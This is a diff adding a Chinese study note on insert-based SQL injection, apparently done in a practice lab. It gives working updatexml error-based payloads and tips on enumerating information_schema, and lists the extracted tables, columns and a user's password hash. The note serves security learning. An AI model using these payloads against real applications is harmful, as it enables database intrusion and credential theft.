@@ -1,0 +1,22 @@
+2026.09.05 笔记
+增改类注入的补充：
+输入为“' or updatexml(1,concat(0x7e,(select id from httpinfo limit 0,1),0x7e),1) or '
+”的payload后显示“列“用户名”不能为空”，一开始以为是payload的问题，检查和修改表名、字段名、布尔逻辑等等依然不行，后面重新用之前能正常反会报错的payload“' or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),1) or '”试了一下，不断增加limit的范围，发现当改为limit5,1的时候会出现相同的“列“用户名”不能为空”报错后，得出结论：
+insert 注入使用 limit 遍历：页面不再返回 MySQL 报错，弹出业务提示（如：列“用户名”不能为空），代表子查询已经没有数据，不等于payload语法错误。后续改用payload“' or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) or '”一次性把全部结果拉出来，规避空返回触发业务校验的坑。
+
+concat(a,b,c)：同一行，把多个字段拼在一起。
+
+group_concat(字段)：把很多行的同一个字段，拼成一整个长字符串，如：	“' or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) or '”，没有用limit，可以一次性把table_name获取出来，但依然受限于字符长度。
+
+同一条SQL语句，不允许一边更新/写入某张表，一边子查询读取这张	一模一样的表，会直接抛出报错：你不能在FROM子句中指定目标表进行更新。
+
+最终查询出的信息：
+表名
+httpinfo
+	字段名id、userid、ipaddress、useragent、httpaccept、remoteport
+member
+	字段名id、username、pw、sex、phonenum、address、email
+		vince e10adc3949ba59abbe56e057f20f883等等（insert注入拿不全，要用盲注）
+users
+	字段名Host、User、Select_priv、Insert_priv、Update_priv、Delete_priv、Create_priv、Drop_priv、Reload_priv、Shutdown_priv、Process_priv、File_priv
+xssblind
